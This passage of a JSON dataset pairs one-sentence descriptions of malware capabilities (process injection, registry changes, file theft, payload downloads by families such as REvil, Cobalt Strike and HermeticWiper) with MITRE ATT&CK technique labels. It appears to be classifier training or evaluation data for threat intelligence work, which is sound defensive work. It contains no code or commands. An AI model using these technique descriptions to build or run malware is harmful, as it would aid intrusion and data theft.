    "text": "A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\\CurrentControlSet\\Control\\Lsa Name.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "IronNetInjector can identify processes via C# methods such as GetProcessesByName and running Tasklist with the Python os.popen function.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects the victim username along with other account information (account type, description, full name, SID and status).",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "HermeticWiper can enumerate common folders such as My Documents, Desktop, and AppData.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "HermeticWiper has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "HermeticWiper can call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "HermeticWiper can determine the OS version, bitness, and enumerate physical drives on a targeted host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ComRAT has encrypted and stored its orchestrator code in the Registry as well as a PowerShell script into the WsqmCons Registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ComRAT can load a PE file from memory or the file system and execute it with CreateProcessW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ComRAT can check the default browser by querying HKCR\\http\\shell\\open\\command.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell has a module to collect information from the local database.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell can search for files in directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell has a module to download and upload files to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell has a command to modify a Registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell can gather a list of processes running on the machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell can gather the IP address from the victim's machine using the IP config command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Caterpillar WebShell can obtain a list of user accounts from a victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Octopus can exfiltrate files from the system using a documents collector tool.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Octopus can collect information on the Windows directory and searches for compressed RAR files on the host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Octopus can download additional files and tools onto the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Octopus can collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Octopus can collect the host IP address from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Octopus can collect the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Octopus has used wmic.exe for local discovery information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "PowerPunch can download payloads from adversary infrastructure.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BlackMould can copy files on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "BlackMould has the ability to find files on the targeted system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "BlackMould has the ability to download files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BlackMould can enumerate local drives on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Flagpro can collect data from a compromised host, including Windows authentication information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Flagpro can download additional malware from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Flagpro can use Native API to enable obfuscation including GetLastError and GetTickCount.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Flagpro has been used to run the tasklist command on a compromised system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Flagpro has been used to execute the ipconfig /all command on a victim system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Flagpro has been used to run the whoami command on the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "KOCTOPUS has executed a PowerShell command to download a file to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "KOCTOPUS has added and deleted keys from the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "KOCTOPUS can use the LoadResource and CreateProcessW APIs for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "KOCTOPUS has checked the OS version using wmic.exe and the find command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "UPPERCUT can download and upload files to and from the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "UPPERCUT has the capability to gather the system’s hostname and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "UPPERCUT has the capability to collect the current logged on user’s username from a machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SysUpdate can search files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SysUpdate has the ability to download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SysUpdate can write its configuration file to Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SysUpdate can determine whether a system has a 32 bit or 64 bit architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SysUpdate can use WMI for execution on a compromised host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "yty gathers information on victim’s drives and has a plugin for document listing.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "yty runs ipconfig /all and collects the domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "yty collects the victim’s username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Rifdoor has the ability to identify the Windows version on the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Rifdoor has the ability to identify the IP address of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Rifdoor has the ability to identify the username on the compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "P.A.S. Webshell has the ability to copy files on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "P.A.S. Webshell can upload and download files to and from compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Anchor can download additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Anchor can determine the hostname and linux version on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Anchor can determine the public IP and location of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "MoleNet can download additional payloads from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MoleNet can collect information about the about the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MoleNet can perform WMI commands on the system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Babuk has the ability to enumerate files on a targeted system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Babuk has the ability to check running processes on a targeted system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Babuk can enumerate disk volumes, get disk information, and query service status.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BADCALL modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\List.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "TSCookie has the ability to discover drive information on the infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TSCookie has the ability to upload and download files to and from the infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TSCookie has the ability to list processes on the infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TSCookie has the ability to identify the IP of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Pony can download additional files onto the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Pony has used several Windows functions for various purposes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Pony has collected the Service Pack, language, and region information to send to the C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal has collected information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal can retrieve a file listing from the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal has the capability to download files to execute on the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal has deleted Registry keys to clean up its prior activity.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal has used the Windows API to communicate with the Service Control Manager to execute a thread.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal can obtain a list of running processes on the victim’s machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal has used the RegQueryValueExA function to retrieve proxy information in the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal has used commands and API calls to gather system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bisonal can execute ipconfig on the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor can upload data and files from a victim's machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor can search for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor has downloaded additional files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor has the ability to use native APIs for execution including GetProcessHeap, GetProcAddress, and LoadLibrary.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor can use GetCurrentProcessId for process discovery.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor can query the Registry on compromised hosts using RegQueryValueExA.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor has collected the MAC address of a compromised host; it can also use GetAdaptersInfo to identify network adapters.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Emotet has been observed injecting in to Explorer.exe and other processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Emotet has used WMI to execute powershell.exe.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DustySky extracts basic information about the operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kinsing has used the find command to search for specific files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kinsing has downloaded additional lateral movement scripts from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Kinsing has used ps to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kinsing has used valid SSH credentials to access remote hosts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Remcos can upload and download files to and from the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Remcos has full control of the Registry, including the ability to modify it.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "xCaon has uploaded files from victims' machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "xCaon has a command to download files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "xCaon has leveraged native OS function calls to retrieve victim's network adapter's information using GetAdapterInfo() API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "xCaon has used the GetAdaptersInfo() API call to get the victim's MAC address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Peirates can use stolen service account tokens to perform its operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "MirageFox can collect CPU and architecture information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MirageFox can gather the username from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Dyre has the ability to directly inject its code into the web browser process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dyre has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Dyre has the ability to identify network settings on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Dyre has the ability to identify the users on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FinFisher queries Registry values as part of its anti-sandbox checks.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FinFisher checks if the victim OS is 32 or 64-bit.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "build_downer has the ability to download files from C2 to the infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "build_downer has the ability to use the WinExec API to execute malware on a compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "build_downer has the ability to send system volume information to C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SpicyOmelette has collected data and other information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SpicyOmelette can download malicious files from threat actor controlled AWS URL's.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SpicyOmelette can identify the system name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SpicyOmelette can identify the IP of a compromised system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA has uploaded files and information from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA can enumerate files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA has downloaded files onto a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA has enumerated processes by ID, name, or privileges.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA can inject into running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SLOTHFULMEDIA has collected the username from a victim machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "REvil has the ability to identify specific files and directories that are not to be encrypted.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "REvil can download a copy of itself from an attacker controlled IP address to the victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "REvil can save encryption parameters and system information to the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "REvil can use Native API for execution and to retrieve active services.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "REvil can inject itself into running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "REvil can query the Registry to get random file extensions to append to encrypted files.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "REvil can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "REvil can use WMI to monitor for and kill specific processes listed in its configuration file.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "A system info module in CozyCar gathers information on the victim host’s configuration.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "YAHOYAH checks for the system’s Windows OS version and hostname.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PS1 can inject its payload DLL Into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has dropped payload and configuration files to disk. Ursnif has also been used to download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has used Registry modifications as part of its installation routine.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "ObliqueRAT has the ability to recursively enumerate files on an infected endpoint.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "ObliqueRAT can check for blocklisted process names on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ObliqueRAT has the ability to check for blocklisted computer names on infected endpoints.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ObliqueRAT can check for blocklisted usernames on infected endpoints.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SYSCON has the ability to use Tasklist to list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SYSCON has the ability to use Systeminfo to identify system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can explore files on a compromised system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can deliver additional payloads to victim machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can modify Registry values within HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\ to enable the execution of additional code.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike's Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike's Beacon payload can collect information on process details.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike has the ability to load DLLs via reflective injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can query HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\ to determine if the security setting for restricting default programmatic access is enabled.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can determine the NetBios name and the IP addresses of targets machines including domain controllers.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Donut can download and execute previously staged shellcode payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Donut code modules use various API functions to load and inject code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Donut includes subprojects that enumerate and identify information about Process Injection candidates.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Donut includes a subproject DonutTest to inject shellcode into a target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "CARROTBALL has the ability to download and install a remote payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Explosive has a function to download a file to the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Explosive has a function to write itself to Registry values.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Explosive has a function to call the OpenClipboard wrapper.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Explosive has collected the computer name from the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Explosive has collected the MAC address from the victim's machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Explosive has collected the username from the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can collect information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can browse directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can set and delete Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can enumerate processes on a targeted system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can inject into the svchost.exe process for execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can execute binaries through process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Clambling has the ability to enumerate Registry keys, including KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir to search for a bitcoin wallet.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can discover the hostname, computer name, and Windows version of a targeted machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can enumerate the IP address of a compromised machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Clambling can identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Rover has functionality to remove Registry Run key persistence as a cleanup procedure.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT downloads and uploads files to and from the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information. FELIXROOT has also used WMI to query the Windows Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
